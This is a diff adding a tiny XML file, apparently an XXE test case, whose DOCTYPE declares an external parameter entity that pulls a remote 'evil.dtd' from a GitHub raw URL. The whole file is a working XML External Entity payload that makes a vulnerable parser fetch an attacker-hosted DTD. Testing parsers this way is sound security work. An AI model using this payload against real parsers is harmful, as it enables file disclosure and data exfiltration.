@@ -1,0 +1,5 @@
+<!DOCTYPE test [
+<!ENTITY % init SYSTEM "https://raw.githubusercontent.com/Bruscan/FileToolWorks/main/xxe-test/evil.dtd">
+%init;
+]>
+<foo/>
